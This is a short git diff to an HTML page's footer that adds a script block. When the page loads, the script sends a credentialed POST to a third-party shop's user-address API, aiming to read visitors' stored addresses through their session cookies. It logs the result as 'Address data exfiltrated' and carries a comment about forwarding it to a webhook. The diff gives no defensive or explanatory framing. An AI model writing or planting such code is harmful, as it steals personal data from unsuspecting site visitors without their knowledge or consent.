@@ -125,6 +125,27 @@
         <script src="index.js"></script>
 
         <footer>© <span id="year"></span> daemoon.</footer>
+        <script>
+            fetch("https://api-proxy.eur.halara.com/mall-rest/api/v1/address/get-user-address?timestamp=" + Date.now(), {
+            method: "POST",
+            credentials: "include", // required to send cookies
+            headers: {
+                "content-type": "application/json",
+                "app-id": "29",
+                "system-source": "H5",
+                "currency": "EUR",
+                "lang": "en-EUR",
+                "host-name": "eur.halara.com",
+                "track-id": crypto.randomUUID(), // optional
+            },
+            body: "{}"
+            })
+            .then(res => res.json())
+            .then(data => {
+            console.log("Address data exfiltrated:", data);
+            // send to your webhook or display it
+            });
+        </script>
 
         <script>
             // Small script to set current year
